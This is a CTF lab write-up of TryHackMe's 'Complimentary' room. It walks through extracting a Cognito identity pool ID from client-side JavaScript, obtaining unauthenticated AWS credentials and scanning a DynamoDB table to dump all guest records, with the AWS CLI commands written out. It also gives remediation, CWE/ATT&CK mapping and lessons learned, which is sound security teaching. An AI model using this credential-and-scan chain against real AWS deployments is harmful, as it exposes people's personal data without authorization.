# TryHackMe — Complimentary (Hacker Holidays Day 3)

**Platform:** TryHackMe  
**Room:** [Complimentary](https://tryhackme.com/room/hh-complimentary-05e0b604)  
**Series:** Hacker Holidays 2026 (Day 3) — Byte Lotus universe  
**Difficulty:** Easy  
**Category:** Cloud Security / AWS  
**Flag:** `THM{fr33_REDACTED_d4t4!}`

---

## Overview

A serverless wellness application hosted entirely on AWS (S3 static site + Cognito Identity Pool + DynamoDB). The app has no backend server — the browser talks directly to AWS services using temporary credentials issued silently by Cognito. The vulnerability is a misconfigured IAM policy on the unauthenticated role that allows a full table scan instead of restricting access to the caller's own records.

## Kill Chain Summary

```
S3 static site (app.js public by design)
    → JS source disclosure: IdentityPoolId + TableName
        → Cognito enhanced flow: GetId → GetCredentialsForIdentity (no auth)
            → Temporary STS credentials (ASIA... + SessionToken)
                → dynamodb:Scan on full table (no LeadingKeys restriction)
                    → All guest profiles dumped → flag in another guest's notes
```

## Standards Mapping

| Framework | ID | Description |
|---|---|---|
| CWE | CWE-200 | Exposure of Sensitive Information (config in client JS) |
| CWE | CWE-862 | Missing Authorization (no row-level access control) |
| MITRE ATT&CK | T1078.004 | Valid Accounts: Cloud Accounts |
| MITRE ATT&CK | T1530 | Data from Cloud Storage Object |
| MITRE ATT&CK | T1580 | Cloud Infrastructure Discovery |
| CloudTrail Detection | GetCredentialsForIdentity | event.outcome: success, user_identity.type: Unknown |

---

## Phase 1 — Reconnaissance

**Objective:** Extract AWS configuration from client-side JavaScript.

The target is an S3-hosted static website — no server-side code exists. The browser must know where to connect, so all AWS configuration is embedded in the JS source.

### 1.1 — Identify JS bundles

```bash
curl -s "http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/" \
  | grep -oE 'src="[^"]+"'
```

**Output:**
```
src="https://sdk.amazonaws.com/js/aws-sdk-2.1500.0.min.js"
src="app.js"
```

Two scripts: the AWS SDK (v2, unmodified from Amazon's CDN) and `app.js` (the application logic). The SDK is standard — all secrets live in `app.js`.

### 1.2 — Extract configuration values

```bash
curl -s "http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/app.js" > bundle.js

# Identity Pool ID (format: region:UUID)
grep -oE 'us-east-1:[0-9a-f-]{36}' bundle.js

# Table name constant definition
grep -iE 'TABLE_NAME\s*=' bundle.js
```

**Output:**
```
us-east-1:836c0949-292d-485b-b532-52d5ca7bb688
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

**Extracted values:**

| Parameter | Value |
|---|---|
| Region | `us-east-1` |
| IdentityPoolId | `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688` |
| TableName | `complimentary-GuestWellnessProfiles` |

> **Note:** The initial `grep` for `TableName` returned `TableName: TABLE_NAME,` — a JavaScript variable reference, not a string literal. A second grep for the constant definition (`TABLE_NAME\s*=`) was needed to find the actual value. Lesson: always trace variable assignments, don't treat code tokens as data.

### 1.3 — Why is app.js publicly readable?

This is **not a misconfiguration** — it is an architectural inevitability. S3 static hosting serves files directly to the browser. For the application to function, the browser must download and execute the JS. There is no server-side gatekeeper. Any value embedded in client-side code is public by definition. The security boundary must therefore live in IAM policies, not in code secrecy.

---

## Phase 2 — Credential Access (Cognito Enhanced Flow)

**Objective:** Obtain temporary AWS credentials without authentication.

Amazon Cognito Identity Pool with `AllowUnauthenticatedIdentities = true` issues guest credentials through two unsigned API calls (no SigV4 required).

### 2.1 — Obtain a guest identity

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
  --region us-east-1 \
  --no-sign-request
```

**Output:**
```json
{
    "IdentityId": "us-east-1:4d571309-b07a-c973-bc84-1476c07b34db"
}
```

### 2.2 — Exchange identity for temporary credentials

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:4d571309-b07a-c973-bc84-1476c07b34db" \
  --region us-east-1 \
  --no-sign-request
```

**Output (truncated):**
```json
{
    "Credentials": {
        "AccessKeyId": "ASIA...",
        "SecretKey": "SnkB...Io4D",
        "SessionToken": "IQoJ...tqX",
        "Expiration": "2026-11-13T01:34:49+00:00"
    }
}
```

**Credential indicators:**
- `AccessKeyId` prefix `ASIA` → temporary STS session (permanent keys use `AKIA`)
- `SessionToken` present → must be included in all subsequent API calls
- `Expiration` → credentials auto-rotate (typically 1 hour)

The assumed role is visible in subsequent error messages: `complimentary-cognito-unauth-role`.

### 2.3 — Load credentials into environment

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="SnkB...Io4D"
export AWS_SESSION_TOKEN="IQoJ...tqX"
export AWS_DEFAULT_REGION="us-east-1"
```

---

## Phase 3 — Data Exfiltration

**Objective:** Dump the entire DynamoDB table, including other guests' records.

### 3.1 — Full table scan

```bash
aws dynamodb scan --table-name "complimentary-GuestWellnessProfiles"
```

The `Scan` operation ignores the partition key and iterates over every item in the table. A properly configured IAM policy would either deny `dynamodb:Scan` entirely or enforce a `dynamodb:LeadingKeys` condition restricting results to the caller's own `cognito-identity.amazonaws.com:sub`. Neither restriction exists on `complimentary-cognito-unauth-role`.

### 3.2 — Flag recovery

The flag was found in another guest's `notes` field:

```
"notes": {
    "S": "If you're reading this, the wellness app's guest role can read
          every profile, not just its own. THM{fr33_REDACTED_d4t4!}"
}
```

---

## Vulnerability Assessment

### Title
Broken Object-Level Authorization via Overpermissioned Cognito Unauthenticated IAM Role

### Severity
**High** — CVSS 3.1: **7.5** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### CWE
- **CWE-862** — Missing Authorization (primary: no row-level access control on DynamoDB)
- **CWE-200** — Exposure of Sensitive Information (contributing: config disclosure in client JS, though architectural)

### ATT&CK
- **T1078.004** — Valid Accounts: Cloud Accounts (guest credential issuance)
- **T1530** — Data from Cloud Storage Object (DynamoDB table dump)

### Description
The Complimentary Wellness application uses a serverless architecture where an Amazon Cognito Identity Pool issues temporary AWS credentials to unauthenticated (guest) users. The IAM policy attached to the unauthenticated role (`complimentary-cognito-unauth-role`) permits `dynamodb:Scan` on the `complimentary-GuestWellnessProfiles` table without a `dynamodb:LeadingKeys` condition. This allows any anonymous user to retrieve all records in the table, not just their own.

### Impact
Full disclosure of all guest wellness profiles (names, emails, phone numbers, locations, notes, passwords) to any unauthenticated visitor. In a regulated environment (DORA/TIBER-EU), this constitutes a personal data breach under GDPR Art. 4(12).

### Steps to Reproduce
1. Download `app.js` from the S3-hosted website
2. Extract `IdentityPoolId` and `TableName` from the source
3. Call `cognito-identity get-id` with the pool ID (no authentication)
4. Call `cognito-identity get-credentials-for-identity` with the returned identity
5. Export the temporary credentials and run `dynamodb scan` on the table

### Remediation
1. **Restrict the IAM policy** — add a `Condition` block with `dynamodb:LeadingKeys` bound to `${cognito-identity.amazonaws.com:sub}`
2. **Deny Scan** — allow only `dynamodb:Query`, `dynamodb:GetItem`, `dynamodb:PutItem` on the unauthenticated role
3. **Enable CloudTrail data events** for Cognito Identity Pool resources to detect anomalous `GetCredentialsForIdentity` calls from unknown identity types
4. **Do not store plaintext passwords** in DynamoDB — the `password` attribute was stored as cleartext

### Evidence
```
arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials
→ dynamodb:Scan → complimentary-GuestWellnessProfiles → all guest records returned
```

---

## Lessons Learned

1. **Serverless ≠ no attack surface.** The attack surface shifts from OS/network to IAM policies and service configurations. "No server to hack" does not mean "nothing to exploit."

2. **Client-side code is public by design.** In S3 + Cognito + DynamoDB architecture, every value in JavaScript (pool IDs, table names, regions, SDK calls) is an open book. Security must rely on IAM policy enforcement, never on obscurity.

3. **`Scan` vs `Query` is an authorization boundary.** `Query` works against a single partition key and can be constrained with `LeadingKeys`. `Scan` reads the entire table and bypasses row-level restrictions. Allowing `Scan` on a multi-tenant table is equivalent to removing tenant isolation.

4. **Read the code, don't just grep tokens.** `TableName: TABLE_NAME` looked like a literal but was a variable reference. Tracing the constant definition was necessary — a reminder that automated extraction needs contextual parsing, not just pattern matching.

5. **`--no-sign-request` is a recon signal.** The ability to call `GetId`/`GetCredentialsForIdentity` without any AWS credentials is by design (enhanced auth flow), but it means any leaked pool ID is immediately exploitable. The pool ID is a public identifier, not a secret — and that's the point: the IAM role behind it is the only gate.

---

## Tools Used

| Tool | Purpose |
|---|---|
| curl | Download static site and JS bundles |
| grep | Extract configuration values from JS source |
| AWS CLI (`cognito-identity`) | Unauthenticated credential acquisition |
| AWS CLI (`dynamodb`) | Full table scan / data exfiltration |
